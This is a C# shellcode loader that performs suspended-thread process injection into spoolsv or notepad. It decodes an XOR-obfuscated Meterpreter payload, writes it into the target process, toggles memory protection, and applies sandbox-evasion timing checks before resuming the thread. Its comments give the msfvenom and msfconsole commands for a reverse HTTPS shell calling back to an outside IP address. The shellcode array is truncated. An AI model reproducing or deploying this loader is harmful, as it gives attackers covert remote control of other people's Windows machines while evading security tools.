using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;


namespace SuspendedThreadInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);



        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }


        static void Main(string[] args)
        {

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                if (IsElevated)
                {
                    procName = "spoolsv";
                }
                else
                {
                    procName = "notepad";
                }
            }
            int pid = Process.GetProcessesByName(procName)[0].Id;



            // LISTENER
            // msfconsole -x "use multi/handler; set payload windows/x64/meterpreter/reverse_https; set lport 443; set lhost tun0; set EnableStageEncoding true; set ExitOnSession false; exploit -j -z"

            // PAYLOAD
            // msfvenom -p windows/x64/meterpreter/reverse_https LPORT=443 LHOST=10.10.14.39 EnableStageEncoding=True -f exe -e x64/xor_dynamic  EXITFUNC=thread -f csharp 

            // XOR Encoded with 0xfa by EncoderXOR.exe


            byte[] buf = new byte[843] 
            {
                0x11, 0xdd, 0xa1, 0xa9, 0xa5, 0x4a, 0x60, 0x06, 0x54, 0x8f, 0x07, 0xad, 0xa3, 0xa9, 0xa4,...
            };


            // Decode the payload
            for (int j = 0; j < buf.Length; j++)
            {
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);
            }


                hProcess = OpenProcess(0x001F0FFF, false, pid);

                addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);


                VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x01, out uint lpflOldProtect);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

                DateTime t1 = DateTime.Now;
                System.Threading.Thread.Sleep(10000);
                double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
                if (t2 < 1.5)
                {
                    t1 = DateTime.Now;
                    Sleep(2000);
                    t2 = DateTime.Now.Subtract(t1).TotalSeconds;
                    if (t2 < 1.5)
                    {
                        return;
                    }
                }

                VirtualProtectEx(hProcess, addr, (UIntPtr)buf.Length, 0x40, out lpflOldProtect);

                ResumeThread(hThread);
            }
    }
}
